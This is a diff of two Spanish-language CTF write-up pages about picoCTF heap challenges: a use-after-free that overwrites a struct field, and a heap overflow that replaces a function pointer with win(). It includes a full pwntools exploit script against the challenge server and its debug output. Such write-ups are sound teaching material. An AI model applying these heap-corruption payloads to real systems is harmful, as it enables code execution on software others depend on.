-</span></span></code></pre></div><p>Al principio del codigo se declara un tipo de struct al cual se le llama object</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>a</span><span class=p>[</span><span class=mi>10</span><span class=p>];</span>
-</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>b</span><span class=p>[</span><span class=mi>10</span><span class=p>];</span>
-</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>c</span><span class=p>[</span><span class=mi>10</span><span class=p>];</span>
-</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>flag</span><span class=p>[</span><span class=mi>5</span><span class=p>];</span>
-</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>object</span><span class=p>;</span>
-</span></span></code></pre></div><p>Luego se declara x como ese objeto</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>object</span> <span class=o>*</span><span class=n>x</span><span class=p>;</span>
-</span></span></code></pre></div><p>Con malloc reserva tamaño en el heap concretamente 35 bytes (a[10] + b[10] + c[10] + flag[5] = 35), lurgo con strncpy se guarda bico en flag</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>init</span><span class=p>()</span> <span class=p>{</span>
+</span></span></code></pre></div><p>Al iniciar el programa en la función init() se guarda en el heap &ldquo;pico&rdquo; y después &ldquo;bico&rdquo;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=n>input_data</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>5</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>strncpy</span><span class=p>(</span><span class=n>input_data</span><span class=p>,</span> <span class=s>&#34;pico&#34;</span><span class=p>,</span> <span class=mi>5</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>5</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>strncpy</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=s>&#34;bico&#34;</span><span class=p>,</span> <span class=mi>5</span><span class=p>);</span>
+</span></span></code></pre></div><p>La función write_buffer permite escribir en el heap, en input_data.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Enter your choice: <span class=m>2</span>
+</span></span><span class=line><span class=cl>Data <span class=k>for</span> buffer: hello
 </span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>freed but still in use</span><span class=se>\n</span><span class=s>now memory untracked</span><span class=se>\n</span><span class=s>do you smell the bug?</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>1. Print Heap
+</span></span><span class=line><span class=cl>2. Write to buffer
+</span></span><span class=line><span class=cl>3. Print x
+</span></span><span class=line><span class=cl>4. Print Flag
+</span></span><span class=line><span class=cl>5. Exit
 </span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>object</span><span class=p>));</span>
-</span></span><span class=line><span class=cl>    <span class=nf>strncpy</span><span class=p>(</span><span class=n>x</span><span class=o>-&gt;</span><span class=n>flag</span><span class=p>,</span> <span class=s>&#34;bico&#34;</span><span class=p>,</span> <span class=mi>5</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></div><p>El programa solo imprime la flag si x->flag es igual a pico.</p><p>La opción 5 hace free(x), con lo que el bloque de memoria que ocupaba x en el heap queda disponible para futuras asignaciones, pero x sigue apuntando a esa dirección. La opción 2 pide un tamaño y hace malloc(size) devolviendo seguramente el mismo bloque de memoria que tenia x si se pone el mismo size que tenia x. Luego scanf("%s", alloc) escribe en ese bloque lo que el usuario indique. Con estas dos opciones se puede hacer un uaf (use‑after‑free)</p><p>La estructura ocupa 35 bytes en total, con flag empezando en el offset 30.
-Al pasar como dato una cadena con 30 bytes de relleno más &ldquo;pico&rdquo;:
-Se estara escribiendo &ldquo;pico&rdquo; justo donde antes estaba x->flag.</p><p>Ahora flag ya vale pico y ya se puede ver la flag con la opción 4</p><div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between"></div><div class="page-nav d-flex flex-column flex-sm-row"><div class="card w-100"><div class="card-body d-flex"><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-left" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M5 12l6 6"/><path d="M5 12l6-6"/></svg></div><div class="d-flex flex-column"><div class=text-body-secondary>Prev</div><a href=/ctf/caixa-bank-tech/2025/202507/ class="stretched-link text-reset text-decoration-none">Reto 07</a></div></div></div><div class=m-2></div><div class="card text-end w-100"><div class="card-body d-flex justify-content-end"><div class="d-flex flex-column"><div class=text-body-secondary>Next</div><a href=/ctf/pico/vne/ class="stretched-link text-reset text-decoration-none">VNE</a></div><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M13 18l6-6"/><path d="M13 6l6 6"/></svg></div></div></div></div></main></div></div></div><footer class="footer text-muted"><div class=container-lg><div class=row><div class="col-lg-8 text-center text-lg-start"><ul class=list-inline><li class=list-inline-item><a class=text-muted href=/tags/>Tags</a></li></ul></div><div class="col-lg-8 text-center text-lg-end"><ul class=list-inline><li class=list-inline-item>Brought to you by <a class=text-muted href=https://gethyas.com/>Hyas</a></li></ul></div></div></div></footer><script async src=/js/app.1e84dcdaa5ccef6fe83f6d88ac1e444a1f237111cfa2a7a97427f758e9c27ef4.js integrity="sha256-HoTc2qXM72/oP22IrB5ESh8jcRHPoqepdCf3WOnCfvQ="></script><script async src=/js/flexsearch.78e4b7a9456a2770bd6faffb1f6488b30db12ca157c3df4e89e3ae2e258888ae.js integrity="sha256-eOS3qUVqJ3C9b6/7H2SIsw2xLKFXw99OieOuLiWIiK4="></script><script async src=/js/search-modal.c4c023efcdee308e4b5f1110afe1db6b1656f217e67aa7efe54e2f4bf2feccf8.js integrity="sha256-xMAj783uMI5LXxEQr+HbaxZW8hfmeqfv5U4vS/L+zPg="></script><div class="d-inline-flex fixed-bottom-right pb-4 pe-4"><button id=toTop type=button class="btn btn-primary rounded-circle ms-auto p-2"><span class=visually-hidden>Top</span><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-up" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 15l6-6 6 6"/></svg></button></div><script src=/js/main.js></script></body></html>
+</span></span><span class=line><span class=cl>Enter your choice: <span class=m>1</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   Address   -&gt;   Value
+</span></span><span class=line><span class=cl>+-------------+-----------+
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   0x8a5c720  -&gt;   hello
+</span></span><span class=line><span class=cl>+-------------+-----------+
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   0x8a5c740  -&gt;   bico
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>1. Print Heap
+</span></span><span class=line><span class=cl>2. Write to buffer
+</span></span><span class=line><span class=cl>3. Print x
+</span></span><span class=line><span class=cl>4. Print Flag
+</span></span><span class=line><span class=cl>5. Exit
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Enter your choice:
+</span></span></code></pre></div><p>La diferencia entre las direcciones de pico y bico es de 0x20 (32 en decimal), como el scanf no válida la longitud del input del usuario se puede llegar a cambiar la variable que en un principio no se debería poder cambiar</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Enter your choice: <span class=m>2</span>
+</span></span><span class=line><span class=cl>Data <span class=k>for</span> buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>1. Print Heap
+</span></span><span class=line><span class=cl>2. Write to buffer
+</span></span><span class=line><span class=cl>3. Print x
+</span></span><span class=line><span class=cl>4. Print Flag
+</span></span><span class=line><span class=cl>5. Exit
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Enter your choice: <span class=m>1</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   Address   -&gt;   Value
+</span></span><span class=line><span class=cl>+-------------+-----------+
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   0x8a5c720  -&gt;   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest
+</span></span><span class=line><span class=cl>+-------------+-----------+
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   0x8a5c740  -&gt;   <span class=nb>test</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>1. Print Heap
+</span></span><span class=line><span class=cl>2. Write to buffer
+</span></span><span class=line><span class=cl>3. Print x
+</span></span><span class=line><span class=cl>4. Print Flag
+</span></span><span class=line><span class=cl>5. Exit
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Enter your choice:
+</span></span></code></pre></div><p>La función check_win() lo que hace es saltar a la dirección que tenga la variable que originalmente equivalía a bico</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>check_win</span><span class=p>()</span> <span class=p>{</span> <span class=p>((</span><span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=p>)())</span><span class=o>*</span><span class=p>(</span><span class=kt>int</span><span class=o>*</span><span class=p>)</span><span class=n>x</span><span class=p>)();</span> <span class=p>}</span>
+</span></span></code></pre></div><p>Así que el payload va a ser 32 &ldquo;A&rdquo; + la dirección de la función win</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>HOST</span> <span class=o>=</span> <span class=s2>&#34;mimas.picoctf.net&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>PORT</span> <span class=o>=</span> <span class=mi>64008</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>exe</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./chall_patched&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>exe</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span> <span class=s1>&#39;splitw&#39;</span><span class=p>,</span> <span class=s1>&#39;-h&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=c1>#context.log_level = &#39;warn&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>gdb_script</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>b main
+</span></span></span><span class=line><span class=cl><span class=s1>continue
+</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>conn</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>LOCAL</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>r</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gdb_script</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>HOST</span><span class=p>,</span> <span class=n>PORT</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>conn</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>junk</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>32</span>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>junk</span>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x00000000004011a0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;choice:&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;buffer:&#39;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;choice:&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>output</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>output</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>output</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># good luck pwning :)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>d3bo@archlinux heap2<span class=o>]</span>$ python3 solve.py  DEBUG
+</span></span><span class=line><span class=cl><span class=o>[</span>DEBUG<span class=o>]</span> Received 0xa3 bytes:
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;\n&#39;</span>
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;I have a function, I sometimes like to call it, maybe you should change it\n&#39;</span>
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;\n&#39;</span>
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;1. Print Heap\n&#39;</span>
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;2. Write to buffer\n&#39;</span>
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;3. Print x\n&#39;</span>
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;4. Print Flag\n&#39;</span>
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;5. Exit\n&#39;</span>
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;\n&#39;</span>
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;Enter your choice: &#39;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>DEBUG<span class=o>]</span> Sent 0x2 bytes:
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;2\n&#39;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>DEBUG<span class=o>]</span> Received 0x11 bytes:
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;Data for buffer: &#39;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>DEBUG<span class=o>]</span> Sent 0x29 bytes:
+</span></span><span class=line><span class=cl>    <span class=m>00000000</span>  <span class=m>41</span> <span class=m>41</span> <span class=m>41</span> <span class=m>41</span>  <span class=m>41</span> <span class=m>41</span> <span class=m>41</span> <span class=m>41</span>  <span class=m>41</span> <span class=m>41</span> <span class=m>41</span> <span class=m>41</span>  <span class=m>41</span> <span class=m>41</span> <span class=m>41</span> <span class=m>41</span>  │AAAA│AAAA│AAAA│AAAA│
+</span></span><span class=line><span class=cl>    *
+</span></span><span class=line><span class=cl>    <span class=m>00000020</span>  a0 <span class=m>11</span> <span class=m>40</span> <span class=m>00</span>  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  0a                        │··@·│····│·│
+</span></span><span class=line><span class=cl>    <span class=m>00000029</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>DEBUG<span class=o>]</span> Received 0x57 bytes:
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;\n&#39;</span>
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;1. Print Heap\n&#39;</span>
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;2. Write to buffer\n&#39;</span>
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;3. Print x\n&#39;</span>
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;4. Print Flag\n&#39;</span>
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;5. Exit\n&#39;</span>
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;\n&#39;</span>
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;Enter your choice: &#39;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>DEBUG<span class=o>]</span> Sent 0x2 bytes:
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;4\n&#39;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>DEBUG<span class=o>]</span> Received 0x2a bytes:
+</span></span><span class=line><span class=cl>    b<span class=s1>&#39;picoCTF{and_********_91218226}\n&#39;</span>
+</span></span><span class=line><span class=cl>b<span class=s1>&#39; picoCTF{and_********_91218226}\n&#39;</span>
+</span></span></code></pre></div><div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between"></div><div class="page-nav d-flex flex-column flex-sm-row"><div class="card text-end w-100"><div class="card-body d-flex justify-content-end"><div class="d-flex flex-column"><div class=text-body-secondary>Next</div><a href=/ctf/pico/pietime2/ class="stretched-link text-reset text-decoration-none">PIE TIME 2</a></div><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M13 18l6-6"/><path d="M13 6l6 6"/></svg></div></div></div></div></main></div></div></div><footer class="footer text-muted"><div class=container-lg><div class=row><div class="col-lg-8 text-center text-lg-start"><ul class=list-inline><li class=list-inline-item><a class=text-muted href=/tags/>Tags</a></li></ul></div><div class="col-lg-8 text-center text-lg-end"><ul class=list-inline><li class=list-inline-item>Brought to you by <a class=text-muted href=https://gethyas.com/>Hyas</a></li></ul></div></div></div></footer><script async src=/js/app.1e84dcdaa5ccef6fe83f6d88ac1e444a1f237111cfa2a7a97427f758e9c27ef4.js integrity="sha256-HoTc2qXM72/oP22IrB5ESh8jcRHPoqepdCf3WOnCfvQ="></script><script async src=/js/flexsearch.78e4b7a9456a2770bd6faffb1f6488b30db12ca157c3df4e89e3ae2e258888ae.js integrity="sha256-eOS3qUVqJ3C9b6/7H2SIsw2xLKFXw99OieOuLiWIiK4="></script><script async src=/js/search-modal.c4c023efcdee308e4b5f1110afe1db6b1656f217e67aa7efe54e2f4bf2feccf8.js integrity="sha256-xMAj783uMI5LXxEQr+HbaxZW8hfmeqfv5U4vS/L+zPg="></script><div class="d-inline-flex fixed-bottom-right pb-4 pe-4"><button id=toTop type=button class="btn btn-primary rounded-circle ms-auto p-2"><span class=visually-hidden>Top</span><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-up" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 15l6-6 6 6"/></svg></button></div><script src=/js/main.js></script></body></html>
